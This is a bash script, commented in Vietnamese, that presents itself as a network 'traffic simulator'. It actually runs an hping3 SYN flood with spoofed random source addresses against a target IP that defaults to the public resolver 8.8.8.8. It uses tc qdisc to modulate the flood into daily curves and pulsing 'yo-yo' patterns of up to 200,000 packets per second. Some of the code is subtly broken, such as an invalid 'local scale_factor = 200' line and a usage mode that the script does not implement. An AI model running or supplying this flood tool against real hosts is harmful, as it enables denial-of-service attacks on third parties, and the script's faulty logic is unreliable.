#!/bin/bash

# =================================================================
# HPING3 TRAFFIC SIMULATOR WITH TC QDISC OPTIMIZATION
# =================================================================
# Mô phỏng lưu lượng mạng với chu kỳ rút ngắn nhưng giữ nguyên pattern
# Sử dụng tc qdisc để điều chỉnh rate in-place thay vì kill/spawn hping3

# Cấu hình mặc định
TARGET_IP="${1:-8.8.8.8}"
INTERFACE="${2:-eth0}"
DURATION="${3:-300}"
TIME_COMPRESSION="${4:-72}"
LOG_FILE="hping3_traffic_tc_$(date +%Y%m%d_%H%M%S).log"
VERBOSE=true

# Cấu hình TC QDISC
PACKET_SIZE=60          # bytes (typical SYN packet)
BURST_SIZE="64k"        # Token bucket burst size
LATENCY="200ms"         # Maximum latency for tokens
MIN_RATE="10kbit"        # Minimum rate to avoid qdisc errors
MAX_RATE="1gbit"        # Maximum rate limit

# PID của hping3 process
HPING_PID=""
TC_ACTIVE=false

# Hàm logging
log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

# Hàm cleanup - quan trọng để dọn dẹp tc qdisc
cleanup() {
    log "=== CLEANUP STARTED ==="
    
    # Kill hping3 process
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "Killing hping3 process (PID: $HPING_PID)"
        kill -TERM "$HPING_PID"
        sleep 2
        if kill -0 "$HPING_PID" 2>/dev/null; then
            kill -KILL "$HPING_PID"
        fi
        wait "$HPING_PID" 2>/dev/null
    fi
    
    # Remove tc qdisc
    if [ "$TC_ACTIVE" = true ]; then
        log "Removing tc qdisc from interface $INTERFACE"
        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
        TC_ACTIVE=false
    fi
    
    log "=== CLEANUP COMPLETED ==="
    exit 0
}

# Trap cleanup on script exit
trap cleanup EXIT INT TERM

# Hàm tính toán thời gian thực tế dựa trên compression
get_compressed_hour() {
    local elapsed_seconds=$1
    local compression_factor=$TIME_COMPRESSION
    
    local virtual_hours=$(echo "scale=6; $elapsed_seconds * $compression_factor / 3600" | bc -l)
    local current_hour=$(echo "scale=0; $virtual_hours % 24" | bc -l)
    
    echo "$current_hour"
}

get_compressed_day() {
    local elapsed_seconds=$1
    local compression_factor=$TIME_COMPRESSION
    
    local virtual_hours=$(echo "scale=6; $elapsed_seconds * $compression_factor / 3600" | bc -l)
    local virtual_days=$(echo "scale=6; $virtual_hours / 24" | bc -l)
    local day_of_week=$(echo "scale=0; ($virtual_days % 7) + 1" | bc -l)
    
    echo "$day_of_week"
}

# Hàm tính toán traffic rate theo giờ (giữ nguyên công thức)
calculate_hourly_rate() {
    local hour=$1
    local scale_factor = 200
    
    # Hàm T(t) - Traffic pattern theo giờ
    local morning_peak=$(echo "scale=6; 25 * e(-1 * (($hour - 9) ^ 2) / 6.25)" | bc -l) 
    local evening_peak=$(echo "scale=6; 45 * e(-1 * (($hour - 20) ^ 2) / 7.84)" | bc -l)
    local night_drop=$(echo "scale=6; -15 * e(-1 * (($hour - 2.5) ^ 2) / 3.24)" | bc -l)
    local daily_cycle=$(echo "scale=6; 5 * s(3.14159 * $hour / 12 - 3.14159/2)" | bc -l)
    local base_level=20
    
    local traffic_factor=$(echo "scale=6; $base_level + $morning_peak + $evening_peak + $night_drop + $daily_cycle" | bc -l)
    local pps=$(echo "scale=0; if($traffic_factor < 5) 800 else ($traffic_factor - 20) * scale_factor" | bc -l)
    
    # Đảm bảo minimum rate trong trường hợp bị lỗi phép toán
    local is_less_than_5=$(echo "$pps < 5" | bc -l)
    if [ "$is_less_than_5" -eq 1 ]; then
        pps=800
        log "Loi phep toan"
    fi
    
    echo "$pps"
}

# Hàm tính toán traffic rate theo ngày trong tuần
calculate_weekly_multiplier() {
    local day_of_week=$1
    local base=87
    local sine_component=$(echo "scale=6; 8 * s(2 * 3.14159 * $day_of_week / 7 + 3.14159/7)" | bc -l)
    local weekend_spike=$(echo "scale=6; 5 * e(-1 * (($day_of_week - 6) ^ 2) / 2.25)" | bc -l)
    local weekly_factor=$(echo "scale=6; ($base + $sine_component + $weekend_spike) / $base" | bc -l)
    
    echo "$weekly_factor"
}

# Hàm mô phỏng minute pattern với time compression
get_compressed_minute_in_hour() {
    local elapsed_seconds=$1
    local compression_factor=$TIME_COMPRESSION
    
    local virtual_seconds=$(echo "scale=6; $elapsed_seconds * $compression_factor" | bc -l)
    local seconds_in_hour=$(echo "scale=0; $virtual_seconds % 3600" | bc -l)
    local minute_in_hour=$(echo "scale=0; $seconds_in_hour / 60" | bc -l)
    
    echo "$minute_in_hour"
}

# Hàm chuyển đổi PPS sang bandwidth (bits per second)
pps_to_bandwidth() {
    local pps=$1
    local packet_size=$PACKET_SIZE
    
    # Tính bandwidth = PPS * packet_size * 8 (convert to bits)
    local bps=$(echo "scale=0; $pps * $packet_size * 8" | bc -l)
    
    # Đảm bảo minimum bandwidth
    local min_bps=1000  # 1kbps
    if [ $(echo "$bps < $min_bps" | bc -l) -eq 1 ]; then
        bps=$min_bps
    fi
    
    # Chuyển đổi sang đơn vị phù hợp cho tc
    if [ $(echo "$bps >= 1000000000" | bc -l) -eq 1 ]; then
        # >= 1Gbps
        local gbps=$(echo "scale=2; $bps / 1000000000" | bc -l)
        echo "${gbps}gbit"
    elif [ $(echo "$bps >= 1000000" | bc -l) -eq 1 ]; then
        # >= 1Mbps
        local mbps=$(echo "scale=2; $bps / 1000000" | bc -l)
        echo "${mbps}mbit"
    elif [ $(echo "$bps >= 1000" | bc -l) -eq 1 ]; then
        # >= 1Kbps
        local kbps=$(echo "scale=0; $bps / 1000" | bc -l)
        echo "${kbps}kbit"
    else
        # < 1Kbps
        echo "1kbit"
    fi
}

# Hàm khởi tạo tc qdisc
init_tc_qdisc() {
    log "Initializing TC qdisc on interface $INTERFACE"
    
    # Remove existing qdisc if any
    tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
    
    # Add initial TBF qdisc with minimum rate
    if tc qdisc add dev "$INTERFACE" root tbf rate "$MIN_RATE" burst "$BURST_SIZE" latency "$LATENCY"; then
        TC_ACTIVE=true
        log "TC qdisc initialized successfully"
        return 0
    else
        log "ERROR: Failed to initialize TC qdisc"
        return 1
    fi
}

# Hàm cập nhật tc qdisc rate
update_tc_rate() {
    local new_rate="$1"
    
    if [ "$TC_ACTIVE" = true ]; then
        if tc qdisc change dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY" 2>/dev/null; then
            return 0
        else
            log "WARNING: Failed to update TC rate to $new_rate, reinitializing..."
            # Try to reinitialize
            tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
            if tc qdisc add dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY"; then
                return 0
            else
                log "ERROR: Failed to reinitialize TC qdisc"
                TC_ACTIVE=false
                return 1
            fi
        fi
    else
        return 1
    fi
}

# Hàm khởi chạy hping3 flood
start_hping3_flood() {
    log "Starting hping3 flood to $TARGET_IP"
    
    # Khởi chạy hping3 với flood mode
    hping3 \
        -S \
        --flood \
        --rand-source \
        -p 80 \
        --interface "$INTERFACE" \
        "$TARGET_IP" \
        >> "$LOG_FILE" 2>&1 &
    
    HPING_PID=$!
    
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "hping3 started successfully (PID: $HPING_PID)"
        return 0
    else
        log "ERROR: Failed to start hping3"
        return 1
    fi
}

# Hàm tạo pattern với TC qdisc optimization
generate_compressed_pattern_tc() {
    local duration_seconds=$1
    local compression_factor=$TIME_COMPRESSION
    
    log "=== TC QDISC TIME COMPRESSION SIMULATION ==="
    log "Compression factor: ${compression_factor}x"
    log "Real duration: ${duration_seconds}s = Virtual duration: $(echo "scale=1; $duration_seconds * $compression_factor / 3600" | bc -l) hours"
    log "Virtual speed: 1 real second = $(echo "scale=1; $compression_factor / 60" | bc -l) virtual minutes"
    log "Packet size: ${PACKET_SIZE} bytes"
    log "TC parameters: burst=$BURST_SIZE, latency=$LATENCY"
    
    # Khởi tạo TC qdisc
    if ! init_tc_qdisc; then
        log "ERROR: Cannot initialize TC qdisc, falling back to legacy mode"
        generate_compressed_pattern_legacy "$duration_seconds"
        return
    fi
    
    # Khởi chạy hping3 flood
    if ! start_hping3_flood; then
        log "ERROR: Cannot start hping3 flood"
        return 1
    fi
    
    local update_interval=3  # Update mỗi 3 seconds cho smooth hơn
    local current_time=0
    local last_rate=""
    
    while [ $current_time -lt $duration_seconds ]; do
        # Tính toán thời gian ảo
        local virtual_hour=$(get_compressed_hour $current_time)
        local virtual_day=$(get_compressed_day $current_time)
        local virtual_minute=$(get_compressed_minute_in_hour $current_time)
        
        # Tính toán rate dựa trên các hàm pattern
        local hourly_rate=$(calculate_hourly_rate $virtual_hour)
        local weekly_multiplier=$(calculate_weekly_multiplier $virtual_day)
        
        # Thêm minute variation
        local minute_factor=$(echo "scale=6; 1 + 0.3 * s(2 * 3.14159 * $virtual_minute / 60)" | bc -l)
        
        # Kết hợp các factor
        local base_rate=$(echo "scale=6; $hourly_rate * $weekly_multiplier * $minute_factor" | bc -l)
        
        # Thêm nhiễu ngẫu nhiên ±15% (giảm từ 20% để ổn định hơn)
        local noise=$(echo "scale=6; (($RANDOM % 60) - 30) / 200" | bc -l)
        local final_rate_float=$(echo "scale=6; $base_rate * (1 + $noise)" | bc -l)
        
        # Chuyển về số nguyên
        local final_pps=$(echo "scale=0; if($final_rate_float < 1) 1 else ($final_rate_float + 0.5) / 1" | bc -l)
        
        # Đảm bảo final_pps là số nguyên dương
        if [ -z "$final_pps" ] || [ "$final_pps" -lt 1 ]; then
            final_pps=1
        fi
        
        # Chuyển đổi PPS sang bandwidth
        local bandwidth=$(pps_to_bandwidth "$final_pps")
        
        # Chỉ update TC rate nếu khác với rate trước đó (tối ưu performance)
        if [ "$bandwidth" != "$last_rate" ]; then
            if update_tc_rate "$bandwidth"; then
                log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth}"
                last_rate="$bandwidth"
            else
                log "T+${current_time}s | ERROR: Failed to update TC rate to $bandwidth"
                # Continue with old rate
            fi
        else
            # Rate không đổi, chỉ log nếu verbose
            if [ "$VERBOSE" = true ]; then
                log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth} [unchanged]"
            fi
        fi
        
        # Đợi interval
        sleep $update_interval
        current_time=$((current_time + update_interval))
    done
}

# Hàm legacy cho trường hợp TC qdisc không hoạt động
generate_compressed_pattern_legacy() {
    local duration_seconds=$1
    
    log "=== LEGACY MODE (KILL/SPAWN) ==="
    log "Using original kill/spawn method as fallback"
    
    local update_interval=5
    local current_time=0
    
    while [ $current_time -lt $duration_seconds ]; do
        local virtual_hour=$(get_compressed_hour $current_time)
        local virtual_day=$(get_compressed_day $current_time)
        local virtual_minute=$(get_compressed_minute_in_hour $current_time)
        
        local hourly_rate=$(calculate_hourly_rate $virtual_hour)
        local weekly_multiplier=$(calculate_weekly_multiplier $virtual_day)
        local minute_factor=$(echo "scale=6; 1 + 0.3 * s(2 * 3.14159 * $virtual_minute / 60)" | bc -l)
        
        local base_rate=$(echo "scale=6; $hourly_rate * $weekly_multiplier * $minute_factor" | bc -l)
        local noise=$(echo "scale=6; (($RANDOM % 80) - 100) / 500" | bc -l)
        local final_rate_float=$(echo "scale=6; $base_rate * (1 + $noise)" | bc -l)
        local final_rate=$(echo "scale=0; if($final_rate_float < 1) 1 else ($final_rate_float + 0.5) / 1" | bc -l)
        
        if [ -z "$final_rate" ] || [ "$final_rate" -lt 1 ]; then
            final_rate=1
        fi
        
        log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | Rate: ${final_rate}pps [LEGACY]"
        
        run_hping3_burst "$TARGET_IP" "$final_rate" "$update_interval" &
        local hping_pid=$!
        
        sleep $update_interval
        
        if kill -0 $hping_pid 2>/dev/null; then
            kill $hping_pid
            wait $hping_pid 2>/dev/null
        fi
        
        current_time=$((current_time + update_interval))
    done
}

# Hàm tạo Yo-Yo pattern với TC optimization
generate_yoyo_pattern_tc() {
    local duration_seconds=$1
    local yoyo_type="${2:-square}"
    
    log "=== TC QDISC YO-YO PATTERN SIMULATION ==="
    log "Type: $yoyo_type | Duration: ${duration_seconds}s"
    log "Simulating bot/automated traffic behavior with TC qdisc"
    
    # Khởi tạo TC qdisc
    if ! init_tc_qdisc; then
        log "ERROR: Cannot initialize TC qdisc for yo-yo pattern"
        return 1
    fi
    
    # Khởi chạy hping3 flood
    if ! start_hping3_flood; then
        log "ERROR: Cannot start hping3 flood for yo-yo pattern"
        return 1
    fi
    
    local update_interval=2
    local current_time=0
    local cycle_duration=20
    
    while [ $current_time -lt $duration_seconds ]; do
        local cycle_position=$(echo "scale=6; ($current_time % $cycle_duration) / $cycle_duration" | bc -l)
        local pps=10000
        
        case "$yoyo_type" in
            "square")
                local is_first_half=$(echo "$cycle_position < 0.5" | bc -l)
                if [ "$is_first_half" -eq 1 ]; then
                    pps=100000
                else
                    pps=10000
                fi
                ;;
            "sawtooth")
                local is_ramp_phase=$(echo "$cycle_position < 0.8" | bc -l)
                if [ "$is_ramp_phase" -eq 1 ]; then
                    local rate_float=$(echo "scale=6; 10000 + 90000 * $cycle_position / 0.8" | bc -l)
                    pps=$(echo "scale=0; ($rate_float + 0.5) / 1" | bc -l)
                else
                    pps=10000
                fi
                ;;
            "burst")
                local is_burst_phase=$(echo "$cycle_position < 0.1" | bc -l)
                local is_cooldown_phase=$(echo "$cycle_position < 0.2" | bc -l)
                
                if [ "$is_burst_phase" -eq 1 ]; then
                    pps=200000
                elif [ "$is_cooldown_phase" -eq 1 ]; then
                    pps=50000
                else
                    pps=5000
                fi
                ;;
            *)
                pps=50000
                ;;
        esac
        
        if [ -z "$pps" ] || [ "$pps" -lt 1 ]; then
            pps=1000
        fi
        
        local bandwidth=$(pps_to_bandwidth "$pps")
        
        if update_tc_rate "$bandwidth"; then
            log "T+${current_time}s | Cycle: $(printf "%.2f" $cycle_position) | PPS: ${pps} | BW: ${bandwidth} [$yoyo_type]"
        else
            log "T+${current_time}s | ERROR: Failed to update yo-yo rate to $bandwidth"
        fi
        
        sleep $update_interval
        current_time=$((current_time + update_interval))
    done
}

# Hàm legacy run_hping3_burst (backup)
run_hping3_burst() {
    local target=$1
    local rate=$2
    local duration=$3
    
    local rate_int=$(echo "scale=0; $rate / 1" | bc -l)
    local interval_us=$(echo "scale=0; 1000000 / $rate_int" | bc -l)
    local total_packets=$(echo "scale=0; $rate_int * $duration" | bc -l)
    
    if [ "$total_packets" -lt 1 ]; then
        total_packets=1
    fi
    
    hping3 \
        -S \
        -p 80 \
        -i "u$interval_us" \
        -c "$total_packets" \
        --interface "$INTERFACE" \
        "$target" \
        >> "$LOG_FILE" 2>&1 || true
}

# Hàm kiểm tra dependencies
check_dependencies() {
    local missing_deps=()
    
    if ! command -v hping3 &> /dev/null; then
        missing_deps+=("hping3")
    fi
    
    if ! command -v bc &> /dev/null; then
        missing_deps+=("bc")
    fi
    
    if ! command -v tc &> /dev/null; then
        missing_deps+=("iproute2")
    fi
    
    if [[ $EUID -ne 0 ]]; then
        log "ERROR: Root privileges required for hping3 and tc qdisc"
        exit 1
    fi
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log "ERROR: Missing dependencies: ${missing_deps[*]}"
        log "Install with: apt-get install ${missing_deps[*]}"
        exit 1
    fi
    
    # Test interface exists
    if ! ip link show "$INTERFACE" &>/dev/null; then
        log "ERROR: Interface $INTERFACE does not exist"
        log "Available interfaces:"
        ip link show | grep -E "^[0-9]+:" | awk -F: '{print "  " $2}' | tee -a "$LOG_FILE"
        exit 1
    fi
}

# Hàm hiển thị usage
show_usage() {
    cat << EOF
Usage: $0 [TARGET_IP] [INTERFACE] [DURATION] [COMPRESSION] [MODE] [YOYO_TYPE]

OPTIMIZATIONS:
    - Uses TC qdisc TBF (Token Bucket Filter) for in-place rate control
    - Single hping3 flood process instead of kill/spawn cycles
    - Smooth rate transitions with 3-second intervals
    - Automatic fallback to legacy mode if TC fails

PARAMETERS:
    TARGET_IP     - Target IP (default: 8.8.8.8)
    INTERFACE     - Network interface (default: eth0)
    DURATION      - Real duration in seconds (default: 300)
    COMPRESSION   - Time compression factor (default: 72)
    MODE          - tc-compressed, tc-yoyo, compressed (legacy), yoyo (legacy)
    YOYO_TYPE     - square, sawtooth, burst (for yo-yo modes)

TC QDISC EXAMPLES:
    $0 8.8.8.8 eth0 300 72 tc-compressed       # TC optimized compressed
    $0 8.8.8.8 eth0 180 1 tc-yoyo square       # TC optimized yo-yo
    $0 8.8.8.8 eth0 300 72 compressed          # Legacy mode

TECHNICAL NOTES:
    - Requires root privileges for tc qdisc manipulation
    - Packet size assumed: ${PACKET_SIZE} bytes
    - TC burst size: ${BURST_SIZE}
    - TC latency: ${LATENCY}
    - Bandwidth calculation: PPS × packet_size × 8 bits

MONITORING:
    - Monitor TC qdisc: tc -s qdisc show dev [interface]
    - Log file: ${LOG_FILE}
EOF
}

# Main function
main() {
    local mode="${5:-tc-compressed}"
    local yoyo_type="${6:-square}"
    
    log "=== TC QDISC OPTIMIZED HPING3 TRAFFIC SIMULATOR ==="
    log "Target: $TARGET_IP"
    log "Interface: $INTERFACE"
    log "Duration: ${DURATION}s"
    log "Compression: ${TIME_COMPRESSION}x"
    log "Mode: $mode"
    if [[ "$mode" == *"yoyo"* ]]; then
        log "Yo-yo Type: $yoyo_type"
    fi
    log "Packet Size: ${PACKET_SIZE} bytes"
    log "TC Burst: ${BURST_SIZE}, Latency: ${LATENCY}"
    
    check_dependencies
    
    # Test connectivity
    if ! ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
        log "WARNING: Target $TARGET_IP may not be reachable"
    fi
    
    case "$mode" in
        "tc-compressed")
            generate_compressed_pattern_tc "$DURATION"
            ;;
        "tc-yoyo")
            generate_yoyo_pattern_tc "$DURATION" "$yoyo_type"
            ;;
        "compressed")
            generate_compressed_pattern_legacy "$DURATION"
            ;;
        *)
            log "ERROR: Unknown mode: $mode"
            log "Available modes: tc-compressed, tc-yoyo, compressed"
            show_usage
            exit 1
            ;;
    esac
    
    log "=== SIMULATION COMPLETED ==="
    log "Log file: $LOG_FILE"
}

# Xử lý command line
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_usage
    exit 0
fi

main "$@"
